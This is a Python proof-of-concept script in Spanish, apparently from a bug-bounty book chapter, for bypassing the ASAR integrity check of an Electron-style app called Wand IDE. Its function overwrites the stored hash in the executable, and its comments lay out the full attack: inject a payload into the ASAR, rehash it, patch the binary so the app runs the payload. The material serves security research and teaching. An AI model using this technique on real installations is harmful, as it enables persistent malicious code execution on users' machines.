# Extraído de: LibroBugBounty/cap-05-asar-tampering.md
#!/usr/bin/env python3
"""
PoC de hash patching en Wand IDE.
Modifica el ASAR y parchea el hash de integridad en el ejecutable.

AVISO: Solo para investigaciÃ³n de seguridad autorizada.
"""
import hashlib
from pathlib import Path

def patch_hash(exe_path: str, old_hash: str, new_hash: str):
    """Reemplaza el hash de integridad en el ejecutable."""
    data = bytearray(Path(exe_path).read_bytes())

    old_bytes = old_hash.encode('ascii')
    new_bytes = new_hash.encode('ascii')

    offset = data.find(old_bytes)
    if offset == -1:
        raise ValueError("Hash original no encontrado en el binario")

    # Parchear
    data[offset:offset + 64] = new_bytes

    # Verificar que no hay mÃ¡s ocurrencias
    second = data.find(old_bytes, offset + 64)
    if second != -1:
        print(f"AVISO: segunda ocurrencia en offset {hex(second)}")

    Path(exe_path).write_bytes(bytes(data))
    return offset


# Flujo completo del ataque contra Wand IDE:
#
# 1. Leer hash original del ejecutable
# original_hash = find_hash_in_binary("Wand.exe")[0]["hash"]
#
# 2. Modificar el ASAR con payload
# tamper_asar("resources/app.asar", "resources/app_new.asar", PAYLOAD)
#
# 3. Calcular hash del nuevo ASAR
# new_hash = hashlib.sha256(
#     Path("resources/app_new.asar").read_bytes()
# ).hexdigest()
#
# 4. Parchear hash en el ejecutable
# patch_hash("Wand.exe", original_hash, new_hash)
#
# 5. Reemplazar ASAR
# Resultado: Wand carga el ASAR modificado,
#            verifica el hash (ahora coincide),
#            ejecuta el payload
